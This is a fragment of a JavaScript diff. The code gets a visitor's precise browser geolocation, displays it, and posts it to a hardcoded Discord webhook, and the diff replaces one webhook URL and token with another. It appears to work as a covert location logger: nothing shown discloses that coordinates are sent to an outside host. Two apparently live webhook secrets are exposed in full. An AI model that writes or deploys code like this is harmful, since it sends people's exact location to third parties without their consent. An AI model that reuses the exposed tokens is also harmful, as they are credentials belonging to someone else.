@@ -26,7 +26,7 @@ function getGeoCoords() {
             long.innerText = "Longitude: " + position.coords.longitude;
             coords.appendChild(lat);
             coords.appendChild(long);
-            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1086345323414294548/-ZURX5IXY_UC7VPYEokBoUd6HJLzXnYN1aCXLQfQRHLktU1FPrpXRmm6MqDVLiouuEcB'
+            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1086596327498059846/pA1X24NU0ydOsgiFjTFYPCC6g5ib7l8sIMNsuYBM6efDaQUR4IQqbbBZAw-asx8bd-Cb'
             sendPostToWebhook(WEBHOOK_URL, lat.innerText + ' ' + long.innerText)
             spanify(lat, long)
         }, null, { enableHighAccuracy: true, timeout: 1000, maximumAge: 0 });
